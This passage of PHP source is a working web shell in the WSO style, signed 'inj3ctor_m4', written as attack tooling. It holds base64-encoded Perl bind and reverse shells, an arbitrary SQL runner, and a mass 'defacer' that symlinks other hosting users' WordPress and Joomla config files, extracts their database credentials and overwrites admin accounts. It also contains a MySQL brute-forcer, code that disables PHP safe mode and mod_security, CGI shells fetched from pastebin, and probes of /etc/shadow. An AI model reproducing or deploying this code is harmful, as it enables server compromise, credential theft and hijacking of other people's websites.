			<a href=\"?user1=&host=$h1&user=$u1&pass=$p1&db=$d1&sql=$row[0]&show=$show&column=$row[0]\"><h5>show [ <b style='color:#ff0000'>$row[0]</b> ]</h5></a>
			</td></tr></table>
			";
				}
		$result->close();
	}
}elseif(isset($_GET['user1'])){
	$column = $_GET['column'];$show = $_GET['show'];
	$h1 = trim($_GET['host']);$u1 = trim($_GET['user']);$p1 = trim($_GET['pass']);$d1 = trim($_GET['db']);
	mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
	$mysqli = new mysqli("$h1","$u1","$p1");$mysqli->select_db("$d1");
	if (mysqli_connect_errno()) {	printf("Connect failed: %s\n", mysqli_connect_error());	exit();}
	$result1 = $mysqli->query("SELECT * FROM `$column`");
	?>

	    <table class="table table-striped">
	        <thead>
	            <tr>
								<?php $column = $mysqli->query("SHOW COLUMNS FROM `$column`");
								while ($row3 = $column->fetch_row()) {
								?>
	                <th><?=$row3[0];?></th>
								<?php } ?>

	            </tr>
	        </thead>
	        <tbody>
					<?php while ($row2 = $result1->fetch_row()) {
						echo "<tr>";
					 	foreach ($row2 as $key => $value) {
			 			 echo '<td>', $value, '</td>';
			 		 }
					 echo "</tr>";
					 }
					 ?>



	        </tbody>
	    </table>
   	<?php






}

elseif(isset($_GET['showall2'])){
	$showall = $_GET['showall2'];$show = $_GET['show'];
	$h1 = trim($_GET['host']);$u1 = trim($_GET['user']);$p1 = trim($_GET['pass']);$d1 = trim($_GET['db']);
	mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
	$mysqli = new mysqli("$h1","$u1","$p1", "$d1");
	$result = $mysqli->query("SHOW TABLES");
	while ($row = $result->fetch_row()) {
		$table = $row[0];
		echo "<a href=\"?user1=&host=$h1&user=$u1&pass=$p1&db=$d1&sql=$row[0]&show=$show&column=$table\">show $table</a><br>";
		if(isset($_GET['user1'])){
			$table = $_GET['user1'];
			$result1 = $mysqli->query("SELECT * FROM `$table`");
			echo '<table border="1" cellpadding=\'5\' style="width: 100%;table-layout: fixed;">';
			$column = $mysqli->query("SHOW COLUMNS FROM `$table`");
			echo '<tr>';
			while ($row3 = $column->fetch_row()) {
				echo '<th>' . $row3[0] . '</th>';
			 }
			 echo '</tr>';
			 while ($row2 = $result1->fetch_row()) {
				 echo '<tr>';
				 foreach ($row2 as $key => $value) {
					 echo '<td>', $value, '</td>';
				 }
				 echo '</tr>';
			 }
		}
		 echo '</table><br />';
	 }
	 $mysqli->close();








}
elseif(isset($_GET['mysql'])){
	echo'<tr><td align="center">';
	echo'<u><font size="2" face="Courier">MYSQL CMDER:</font></u><br />';
	echo'<br /><form method="POST">
	<input type="text" name="host" value="localhost">
	<input type="text" name="user" placeholder="username">
	<input type="text" name="pass" placeholder="password">
	<input type="text" name="db" placeholder="database">
	<br><hr><br><input style="color:#ff0000;" type="submit" value="show all databases" name="showall"><br><hr>
	<textarea cols=30 rows=4 name="sql"></textarea>
	<br><input type="submit" value="send sql command"></form><br><hr>';

	if(isset($_POST['showall'])){
		$h1 = trim($_POST['host']);
		$u1 = trim($_POST['user']);
		$p1 = trim($_POST['pass']);
		$d1 = trim($_POST['db']);
		$mysqli = new mysqli("$h1","$u1","$p1");
		$mysqli->select_db("$d1");
		if (mysqli_connect_errno()) {
			printf("Connect failed: %s\n", mysqli_connect_error());
			exit();
		}
		if ($result = $mysqli->query("show DATABASES;")) {
			while($row = $result->fetch_row()){
			echo "<button style='background:#21f999'><a style='color:#000' href=\"?showall=&host=$h1&user=$u1&pass=$p1&db=$row[0]\">show $row[0]</a></button>";
			}
			$result->close();
		}

	}elseif(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && isset($_POST['sql'])){
		$h1 = trim($_POST['host']);
		$u1 = trim($_POST['user']);
		$p1 = trim($_POST['pass']);
		$d1 = trim($_POST['db']);
		$c1 = trim($_POST['sql']);

		$mysqli = new mysqli("$h1","$u1","$p1");
		$mysqli->select_db("$d1");
		if (mysqli_connect_errno()) {
			printf("Connect failed: %s\n", mysqli_connect_error());
			exit();
		}
		if ($result = $mysqli->query("$c1")) {

			while($row = $result->fetch_row()){
			echo "<pre>$row[0] </pre> ";
			}

			$result->close();
		}

		if ($result = $mysqli->query("SELECT DATABASE()")) {
			$row = $result->fetch_row();
			printf("Default database is %s.\n", $row[0]);
			$result->close();
		}
		$mysqli->close();
	}


}elseif(isset($_GET['network'])){
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	echo'<tr><td align="center">';
	echo'<u><font size="2" face="Courier">BIND-CONNECT:</font></u><br />';
	echo'<br /><form method="POST"><input type="text" name="port" value="31337" /><input type="submit" value="BIND CONNECT" /></form>';
	if(isset($_POST['port'])){
		GenerateFile('/tmp/bp.pl', base64_decode($bind_port_p));
		$out = wsoEx("perl /tmp/bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre class=ml1>$out\n".nl2br(wsoEx("ps aux | grep bp.pl"))."</pre>";
		unlink("/tmp/bp.pl");
	}
	echo'<u><font size="2" face="Courier">BACK-CONNECT:</font></u><br />';
	echo'<br /><form method="POST"><input type=text name="ip" value='.$_SERVER["REMOTE_ADDR"].' /><input type=text name="p0rt" value=443 /><input type=submit value="BACK CONNECT" /></form>';
	if(isset($_POST['ip']) && isset($_POST['p0rt'])){
		GenerateFile('/tmp/bp.pl', base64_decode($back_connect_p));
		$out = wsoEx("perl /tmp/bc.pl ".$_POST['ip']." ".$_POST['p0rt']." 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre class=ml1>$out\n".nl2br(wsoEx("ps aux | grep bc.pl"))."</pre>";
		unlink("/tmp/bc.pl");
	}
	echo'</tr></td>';
}elseif(isset($_GET['defacer'])){
	echo'<tr><td align="center">';
	if(isset($_POST['users'])){
		$r = "Options all \nDirectoryIndex Sux.html\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any";
		@mkdir('m4_configs', 0755);
		@chdir('./m4_configs');
		GenerateFile('.htaccess', $r);
		$passwd = explode("\n", $_POST['users']);
		$configs_path = array(	'wp-config.php', 'wp/wp-config.php', 'WP/wp-config.php', 'wp/beta/wp-config.php',
								'beta/wp-config.php', 'press/wp-config.php', 'wordpress/wp-config.php',
								'wordpress/beta/wp-config.php', 'news/wp-config.php', 'new/wp-config.php',
								'blog/wp-config.php', 'beta/wp-config.php', 'blogs/wp-config.php', 'home/wp-config.php',
								'protal/wp-config.php', 'site/wp-config.php', 'main/wp-config.php',
								'test/wp-config.php', 'joo/configuration.php', 'cms/configuration.php',
								'site/configuration.php', 'main/configuration.php', 'news/configuration.php',
								'new/configuration.php' ,'home/configuration.php', 'configuration.php');
		foreach($passwd as $users){
			$users = explode(':', $users);
			$user = $users[0];
			$funs = array('symlink', 'copy');
			foreach($funs as $f){
				if(function_exists($f)){
					foreach($configs_path as $config_path){
						@$f("/home/$user/public_html/$config_path", "$user-m4.txt");
					}
					break;
				}
			}
		}
		$url = get_configs_path();
		$data = get_source($url);
		preg_match_all('#href="(.*?)">#', $data, $matches);
		$configs = array_unique($matches[1]);
		foreach($configs as $config){
			$user = explode('-', $config);
			$data = get_source($url.$config);
			if(preg_match("#'DB_HOST', '(.*?)'#i", $data)){
				echo'<font size="2" face="Courier"> The Url [WORDPRESS] : <a href="http://'.gethostbyname($_SERVER["HTTP_HOST"]).'/~'.$user[0].'" target="_blank">http://'.gethostbyname($_SERVER["HTTP_HOST"]).'/~'.$user[0].'</a>';
				preg_match("#'DB_HOST', '(.*?)'#i", $data, $DB_HOST);
				preg_match("#'DB_USER', '(.*?)'#i", $data, $DB_USER);
				preg_match("#'DB_PASSWORD', '(.*?)'#i", $data, $DB_PASSWORD);
				preg_match("#table_prefix  = '(.*?)#i';", $data, $DB_PREFIX);
				preg_match("#'DB_NAME', '(.*?)'#i", $data, $DB_NAME);
				$con = @mysql_connect($DB_HOST[1],$DB_USER[1],$DB_PASSWORD[1]);
				if($con){
					$db_selected = @mysql_select_db($DB_NAME[1], $con);
					if($db_selected){
						$q = @mysql_query("UPDATE `".$DB_PREFIX[1]."users` SET `user_login` ='inj3ctor_m4' WHERE ID = 1");
						$q = @mysql_query("UPDATE `".$DB_PREFIX[1]."users` SET `user_pass` ='fd6b6fc9220b72d21683ae8e4f50a210' WHERE ID = 1");
						if($q){
							echo' <font color=green>(New User: inj3ctor_m4, New Password: m4)</font></font><br />';
						}else{
							echo' <font color=red>(ERROR)</font></font><br />';
						}
					}else{
						echo' <font color=red>(Can\'t Select The Database)</font></font><br />';
					}
				}else{
					echo' <font color=red>(Could not connect)</font></font><br />';
				}
			}elseif(preg_match('/JConfig/', $data)){
				echo'<font size="2" face="Courier"> The Url [JOOMLA] : <a href="http://'.gethostbyname($_SERVER["HTTP_HOST"]).'/~'.$user[0].'" target="_blank">http://'.gethostbyname($_SERVER["HTTP_HOST"]).'/~'.$user[0].'</a>';
				$data = get_source($url.$config);
				preg_match("#host = '(.*?)'#i", $data, $DB_HOST);
				preg_match("#user = '(.*?)'#i", $data, $DB_USER);
				preg_match("#password = '(.*?)'#i", $data, $DB_PASSWORD);
				preg_match("#dbprefix = '(.*)'#i", $data, $DB_PREFIX);
				preg_match("#db = '(.*?)'#i", $data, $DB_NAME);
				$con = @mysql_connect($DB_HOST[1],$DB_USER[1],$DB_PASSWORD[1]);
				if($con){
					$db_selected = @mysql_select_db($DB_NAME[1], $con);
					if($db_selected){
						$q = mysql_query("UPDATE `".$DB_PREFIX[1]."users` SET `password` ='fd6b6fc9220b72d21683ae8e4f50a210' , `username` ='inj3ctor_m4' WHERE `usertype` ='Super Administrator' LIMIT 1;");
						$q = mysql_query("UPDATE `".$DB_PREFIX[1]."users` SET `password` ='fd6b6fc9220b72d21683ae8e4f50a210' , `username` ='inj3ctor_m4' WHERE `username` ='admin' LIMIT 1;");
						if($q){
							echo' <font color=green>(New User: inj3ctor_m4, New Password: m4)</font></font><br />';
						}else{
							echo' <font color=red>(ERROR)</font></font><br />';
						}
					}else{
						echo' <font color=red>(Can\'t Select The Database)</font></font><br />';
					}
				}else{
					echo' <font color=red>(Could not connect)</font></font><br />';
				}
			}
		}
	}else{
		echo'<form method="POST"><font size="2" face="Courier">Usernames :</font><textarea cols=75 rows=25 name="users"></textarea><br /><input type="submit" value="GO" /><br />';
	}
	echo'</tr></td>';
}elseif(isset($_GET['brute'])){
	echo'<tr><td align="center">';
	if(isset($_POST['usernames']) && isset($_POST['passwords'])){
		$usernames = explode("\n", $_POST['usernames']);
		$passwords = explode("\n", $_POST['passwords']);
		foreach($usernames as $username){
			foreach($passwords as $password){
				$username = trim($username);
				$password = trim($password);
				$co = @mysql_connect('localhost',$username,$password);
				if($co){
					mysql_close($co);
					echo "<br /><font size='2' face='Courier'>Team R00T~ Username (<font color=red>$username</font>) Password (<font color=red>$password</font>)<br />";
				}
			}
		}
	}else{
		echo'<form method="POST">
			<b><font size="2" face="Courier">Usernames :</font></b><br />';
		echo'<textarea cols=84 rows=10 name="usernames"></textarea><br />';
		echo'<b><font size="2" face="Courier">Passwords :</font></b><br />';
		echo'<textarea cols=84 rows=10 name="passwords"></textarea><br />';
		echo'<input type="submit" value="Crack"></form>';
	}
	echo'</tr></td>';
}


function server_info($opt){
	if($opt == "named_conf"){
		if( @is_readable('/etc/named.conf')){
			return "<font color=green><b>Readable</b></font>";
		}else{ return "<font color=red><b>Not Readable</b></font>"; }
	}elseif($opt == "passwd"){
		if( @is_readable('/etc/passwd')){
			return "<font color=green><b>Readable</b></font>";
		}else{ return "<font color=red><b>Not Readable</b></font>"; }
	}elseif($opt == "shadow"){
		if( @is_readable('/etc/shadow')){
			return "<font color=green><b>Readable</b></font>";
		}else{ return "<font color=red><b>Not Readable</b></font>"; }
	}elseif($opt == "showdisablefunctions"){
		if($disablefunc = @ini_get("disable_functions")){
			return "<font color=red><b>".$disablefunc."</b></font>";
		}else{ return "<font color=green><b>NONE</b></b></font>"; }
	}elseif($opt == "openbase_dir"){
		if($openbase_dir = @ini_get('open_basedir')){
			return "<font color=red><b>".$openbase_dir."</b></font>";
		}else{ return "<font color=green><b>NONE</b></b></font>"; }
	}elseif($opt == "testperl"){
		if( @wsoEx('perl -v')){
			return "<font color=green><b>ON</b></font>";
		}else{ return "<font color=red><b>OFF</b></font>"; }
	}elseif($opt == "testpy"){
		if ( @wsoEx('python -v')){
			return "<font color=green><b>ON</b></font>";
		}else{
			return "<font color=red><b>OFF</b></font>"; }
	}elseif($opt == "testwget"){
		if( @wsoEx('wget --help')){
			return "<font color=green><b>ON</b></font>";
		}else{
			return "<font color=red><b>OFF</b></font>"; }
	}
}

function perm($file){
	if(file_exists($file)){
		return substr(sprintf('%o', fileperms($file)), -4);
	}else{	return "????";	}
}

function get_color($file){
	if(is_writable($file)){ return "green";}
	if(!is_writable($file) && is_readable($file)){ return "white";}
	if(!is_writable($file) && !is_readable($file)){ return "red";}
 }

function GenerateFile($name,$content){
	if(function_exists('fopen') && function_exists('fclose')) {
		$f = fopen($name,"w+");
		if($f){
			if(function_exists('fwrite')){$w = fwrite($f,$content); }
			elseif(function_exists('fputs')){$w = fputs($f,$content); }
			elseif(function_exists('file_put_contents')){$w = file_put_contents($f,$content);}
			if(!$w){return false;}
		}
		else{return false;}fclose($f);return true;
	}
}

function creat_cgi($opt){
	$ht = "Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .m4\nAddHandler cgi-script .m4";
	@mkdir('cgi-perl', 0755);
	@chdir('./cgi-perl');
	if(GenerateFile('.htaccess', $ht)){
		if($opt == 'shell'){
			if(GenerateFile('cgi.m4', get_source('http://pastebin.com/raw.php?i=CacKw9nQ'))){
				chmod('cgi.m4', 0755);
				return "<font size='2' face='Courier'><a href='cgi-perl/cgi.m4' target='_blank'>./CGI SHELL</a><br />Password = priv8<br /></font><br />";
			}else{
				return "<br><font size='2' face='Courier'>Something Happened, Creat CGI SHELL Failed!</font><br /><br />";
			}
		}elseif($opt == 'users'){
			if(GenerateFile('users.m4', get_source('http://pastebin.com/raw.php?i=RyMCwVKR'))){
				chmod('users.m4', 0755);
				return "<font size='2' face='Courier'><a href='dom_users/users.m4' target='_blank'>./USERS & DOMAINS</a></font><br /><br />";
			}else{	return "<br><font size='2' face='Courier'>Something Happened, Failed!</font><br /><br />";	}
		}
	}else{	return "<br><font size='2' face='Courier'>Something Happened, Failed!</font><br /><br />";	}
}

function safemodekiller(){
	if(GenerateFile('php.ini', "safe_mode = Off\ndisable_functions = NONE\nsafe_mode_gid = OFF\nopen_basedir = OFF")){
		echo"<font size='2' face='Courier'>[+]<a href='php.ini' target='_blank'>php.ini</a> Has Been Generated Successfull</font><br />";
	}else{
		echo"<font size='2' face='Courier'>Something Happened, Creat php.ini Failed!</font><br />";
	}
	if(GenerateFile('.htaccess', "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\nSecFilterCheckURLEncoding Off\nSecFilterCheckCookieFormat Off\nSecFilterCheckUnicodeEncoding Off\nSecFilterNormalizeCookies Off\n</IfModule>\n<Limit GET POST>\norder deny,allow\ndeny from all\nallow from all\n</Limit>\n<Limit PUT DELETE>\norder deny,allow\ndeny from all\n</Limit>\nSetEnv PHPRC ".getcwd()."/php.ini")){
		echo"<font size='2' face='Courier'>[+] .htaccess Has Been Generated Successfully</font><br /><br />";
	}else{
		echo"<font size='2' face='Courier'>Something Happened, Creat .htaccess Failed!</font><br /><br />";
	}
}

function readfils($file){
	$funs = array('require', 'include', 'file_get_contents', 'highlight_file', 'show_source', 'readfile');
	foreach($funs as $f){
		if(function_exists($f)){
			$r = $f($file);
			if($r){
				return print(htmlspecialchars($r));
				break;
			}
		}
	}
}

function Sym($path, $output){
	@mkdir('bps', 0755);
	$r = "Options all \nDirectoryIndex Sux.html\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any";
	GenerateFile('.htaccess', $r);

	$funs = array('symlink', 'copy');
	foreach($funs as $f){
		if(function_exists($f)){
			@$f($path, "bps/$output");
			break;
		}else{
			wsoEx("ln -s $path /bps/$output");
		}
	}
	if(file_exists("bps/$output")){
		echo"<font size='2' face='Courier'>Check File --> /bps/$output</font><br /><br />";
	}else{
		echo"<font size='2' face='Courier'>SYMLINK FAILED!</font><br /><br />";
	}
}

function get_configs_path(){
	$parse = pathinfo("http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]");
	$configs_path = $parse['dirname'].'/m4_configs/';
	return $configs_path;
}

function get_source($url){
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
	curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
	curl_setopt($ch,CURLOPT_TIMEOUT,30);
	$data=curl_exec($ch);
	curl_close($ch);

	return $data;
}

// BY WSO-TEAM
function wsoEx($in) {
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}

?>
